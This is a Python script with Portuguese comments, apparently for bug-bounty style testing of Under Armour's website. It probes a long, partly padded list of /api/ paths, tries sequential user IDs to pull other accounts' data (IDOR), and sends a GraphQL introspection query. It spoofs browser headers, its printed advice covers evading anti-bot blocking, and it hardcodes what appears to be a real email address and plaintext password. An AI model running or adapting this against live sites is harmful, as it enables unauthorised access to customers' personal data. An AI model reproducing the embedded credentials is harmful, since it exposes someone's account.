#!/usr/bin/env python3
"""
Script simplificado para testes de BAC Horizontal na Under Armour
Usa apenas requests com técnicas de evasão avançadas
"""

import requests
import time
import json
import random
from urllib.parse import urljoin, urlparse

class UnderArmourBACTest:
    def __init__(self):
        self.base_url = "https://www.underarmour.com"
        self.email = "pedroocferreira@gmail.com"
        self.password = "@Pedro9cce22f2"
        self.session = requests.Session()
        self.setup_session()
        
    def setup_session(self):
        """Configura a sessão com headers realistas"""
        print("🔧 Configurando sessão...")
        
        # Headers realistas para simular navegador
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,pt;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0',
            'DNT': '1'
        })
        
    def test_endpoint_access(self, endpoint):
        """Testa se um endpoint está acessível"""
        try:
            url = urljoin(self.base_url, endpoint)
            print(f"🔍 Testando: {url}")
            
            response = self.session.get(url, timeout=10)
            print(f"  Status: {response.status_code}")
            
            if response.status_code == 200:
                print(f"  ✅ Endpoint acessível!")
                return True
            elif response.status_code == 418:
                print(f"  🚫 Bloqueado por proteção anti-bot")
            elif response.status_code == 403:
                print(f"  🔒 Acesso negado")
            elif response.status_code == 401:
                print(f"  🔐 Requer autenticação")
            elif response.status_code == 404:
                print(f"  ❌ Não encontrado")
            else:
                print(f"  ⚠️ Resposta inesperada: {response.status_code}")
                
        except Exception as e:
            print(f"  ❌ Erro: {e}")
            
        return False
    
    def test_bac_horizontal(self, endpoint):
        """Testa BAC Horizontal em um endpoint"""
        print(f"🎯 Testando BAC Horizontal: {endpoint}")
        
        # IDs para testar
        test_ids = [1, 2, 3, 999, 1000, 9999]
        
        for test_id in test_ids:
            try:
                # Construir URL de teste
                if '?' in endpoint:
                    test_url = f"{self.base_url}{endpoint}&id={test_id}"
                else:
                    test_url = f"{self.base_url}{endpoint}?id={test_id}"
                
                print(f"  Testando ID {test_id}: {test_url}")
                
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    print(f"  🚨 POSSÍVEL BAC HORIZONTAL! ID {test_id} acessível")
                    
                    # Verificar se retorna dados
                    try:
                        data = response.json()
                        if data and len(str(data)) > 50:
                            print(f"  📊 Dados retornados: {str(data)[:200]}...")
                            return True
                    except:
                        if len(response.text) > 50:
                            print(f"  📊 Resposta: {response.text[:200]}...")
                            return True
                            
                elif response.status_code == 403:
                    print(f"  ✅ Protegido (403) - ID {test_id}")
                elif response.status_code == 401:
                    print(f"  ✅ Protegido (401) - ID {test_id}")
                elif response.status_code == 404:
                    print(f"  ❌ Não encontrado (404) - ID {test_id}")
                else:
                    print(f"  ⚠️ Resposta inesperada ({response.status_code}) - ID {test_id}")
                    
            except Exception as e:
                print(f"  ❌ Erro ao testar ID {test_id}: {e}")
                
        return False
    
    def test_graphql_endpoint(self):
        """Testa o endpoint GraphQL específico"""
        print("🔍 Testando endpoint GraphQL...")
        
        graphql_url = "https://api.shop.ua.com/graphql"
        
        # Testar introspection query
        introspection_query = {
            "query": "query IntrospectionQuery { __schema { queryType { name } } }"
        }
        
        try:
            response = self.session.post(
                graphql_url,
                json=introspection_query,
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                },
                timeout=10
            )
            
            if response.status_code == 200:
                print("✅ GraphQL endpoint ativo!")
                data = response.json()
                print(f"📊 Resposta: {json.dumps(data, indent=2)[:500]}...")
                return True
            else:
                print(f"❌ GraphQL endpoint inativo (HTTP {response.status_code})")
                
        except Exception as e:
            print(f"❌ Erro ao testar GraphQL: {e}")
            
        return False
    
    def discover_endpoints(self):
        """Descobre endpoints através de técnicas de enumeração"""
        print("🔍 Descobrindo endpoints...")
        
        # Lista de endpoints comuns para testar
        common_endpoints = [
            "/api/user/profile",
            "/api/profile",
            "/api/athlete",
            "/api/workouts",
            "/api/training",
            "/api/exercise",
            "/api/orders",
            "/api/purchases",
            "/api/photos",
            "/api/media",
            "/api/gallery",
            "/api/user",
            "/api/me",
            "/api/account",
            "/api/dashboard",
            "/api/settings",
            "/api/preferences",
            "/api/notifications",
            "/api/messages",
            "/api/friends",
            "/api/followers",
            "/api/activity",
            "/api/stats",
            "/api/achievements",
            "/api/badges",
            "/api/rewards",
            "/api/points",
            "/api/level",
            "/api/rank",
            "/api/leaderboard",
            "/api/competitions",
            "/api/challenges",
            "/api/goals",
            "/api/progress",
            "/api/history",
            "/api/logs",
            "/api/sessions",
            "/api/devices",
            "/api/locations",
            "/api/events",
            "/api/calendar",
            "/api/schedule",
            "/api/reminders",
            "/api/alerts",
            "/api/reports",
            "/api/analytics",
            "/api/metrics",
            "/api/insights",
            "/api/recommendations",
            "/api/suggestions",
            "/api/tips",
            "/api/advice",
            "/api/coaching",
            "/api/guidance",
            "/api/support",
            "/api/help",
            "/api/faq",
            "/api/contact",
            "/api/feedback",
            "/api/reviews",
            "/api/ratings",
            "/api/comments",
            "/api/likes",
            "/api/shares",
            "/api/bookmarks",
            "/api/favorites",
            "/api/wishlist",
            "/api/cart",
            "/api/checkout",
            "/api/payment",
            "/api/billing",
            "/api/subscription",
            "/api/membership",
            "/api/plan",
            "/api/package",
            "/api/offer",
            "/api/promo",
            "/api/coupon",
            "/api/discount",
            "/api/deal",
            "/api/sale",
            "/api/special",
            "/api/limited",
            "/api/exclusive",
            "/api/vip",
            "/api/premium",
            "/api/pro",
            "/api/elite",
            "/api/master",
            "/api/expert",
            "/api/advanced",
            "/api/intermediate",
            "/api/beginner",
            "/api/novice",
            "/api/rookie",
            "/api/amateur",
            "/api/professional",
            "/api/athlete",
            "/api/coach",
            "/api/trainer",
            "/api/instructor",
            "/api/mentor",
            "/api/guide",
            "/api/advisor",
            "/api/consultant",
            "/api/specialist",
            "/api/expert",
            "/api/authority",
            "/api/leader",
            "/api/champion",
            "/api/winner",
            "/api/hero",
            "/api/star",
            "/api/legend",
            "/api/icon",
            "/api/idol",
            "/api/role_model",
            "/api/inspiration",
            "/api/motivation",
            "/api/encouragement",
            "/api/support",
            "/api/help",
            "/api/assistance",
            "/api/aid",
            "/api/service",
            "/api/care",
            "/api/attention",
            "/api/focus",
            "/api/concentration",
            "/api/dedication",
            "/api/commitment",
            "/api/passion",
            "/api/enthusiasm",
            "/api/energy",
            "/api/power",
            "/api/strength",
            "/api/force",
            "/api/might",
            "/api/potency",
            "/api/vigor",
            "/api/vitality",
            "/api/health",
            "/api/wellness",
            "/api/fitness",
            "/api/condition",
            "/api/state",
            "/api/status",
            "/api/position",
            "/api/rank",
            "/api/level",
            "/api/grade",
            "/api/score",
            "/api/rating",
            "/api/assessment",
            "/api/evaluation",
            "/api/measurement",
            "/api/metric",
            "/api/indicator",
            "/api/signal",
            "/api/marker",
            "/api/flag",
            "/api/tag",
            "/api/label",
            "/api/name",
            "/api/title",
            "/api/designation",
            "/api/role",
            "/api/function",
            "/api/purpose",
            "/api/objective",
            "/api/goal",
            "/api/target",
            "/api/aim",
            "/api/intention",
            "/api/plan",
            "/api/strategy",
            "/api/approach",
            "/api/method",
            "/api/technique",
            "/api/system",
            "/api/process",
            "/api/procedure",
            "/api/routine",
            "/api/habit",
            "/api/practice",
            "/api/exercise",
            "/api/workout",
            "/api/training",
            "/api/coaching",
            "/api/instruction",
            "/api/education",
            "/api/learning",
            "/api/development",
            "/api/growth",
            "/api/improvement",
            "/api/enhancement",
            "/api/optimization",
            "/api/maximization",
            "/api/amplification",
            "/api/boost",
            "/api/increase",
            "/api/rise",
            "/api/advancement",
            "/api/progress",
            "/api/evolution",
            "/api/transformation",
            "/api/change",
            "/api/modification",
            "/api/adjustment",
            "/api/adaptation",
            "/api/customization",
            "/api/personalization",
            "/api/individualization",
            "/api/specialization",
            "/api/expertise",
            "/api/mastery",
            "/api/skill",
            "/api/ability",
            "/api/capability",
            "/api/competence",
            "/api/proficiency",
            "/api/talent",
            "/api/gift",
            "/api/strength",
            "/api/advantage",
            "/api/benefit",
            "/api/value",
            "/api/worth",
            "/api/importance",
            "/api/significance",
            "/api/meaning",
            "/api/purpose",
            "/api/reason",
            "/api/cause",
            "/api/motivation",
            "/api/inspiration",
            "/api/drive",
            "/api/ambition",
            "/api/aspiration",
            "/api/dream",
            "/api/vision",
            "/api/mission"
        ]
        
        accessible_endpoints = []
        
        for endpoint in common_endpoints:
            if self.test_endpoint_access(endpoint):
                accessible_endpoints.append(endpoint)
                # Pequena pausa para evitar rate limiting
                time.sleep(0.5)
        
        return accessible_endpoints
    
    def run_tests(self):
        """Executa todos os testes"""
        print("🚀 Iniciando testes de BAC Horizontal na Under Armour...")
        
        try:
            # Descobrir endpoints
            endpoints = self.discover_endpoints()
            print(f"📋 Endpoints acessíveis encontrados: {len(endpoints)}")
            for endpoint in endpoints:
                print(f"  - {endpoint}")
            
            # Testar BAC Horizontal
            vulnerabilities_found = 0
            for endpoint in endpoints:
                if self.test_bac_horizontal(endpoint):
                    vulnerabilities_found += 1
            
            # Testar GraphQL
            if self.test_graphql_endpoint():
                vulnerabilities_found += 1
            
            # Resumo
            print(f"\n🎯 Testes concluídos!")
            print(f"📊 Vulnerabilidades encontradas: {vulnerabilities_found}")
            print(f"📋 Endpoints testados: {len(endpoints)}")
            
            if vulnerabilities_found == 0:
                print("\n💡 Recomendações:")
                print("  1. Use testes manuais com Burp Suite")
                print("  2. Teste em horários diferentes")
                print("  3. Use diferentes User-Agents")
                print("  4. Teste com VPN/proxy")
                print("  5. Foque em endpoints específicos do programa")
            
        except Exception as e:
            print(f"❌ Erro geral: {e}")

if __name__ == "__main__":
    tester = UnderArmourBACTest()
    tester.run_tests()
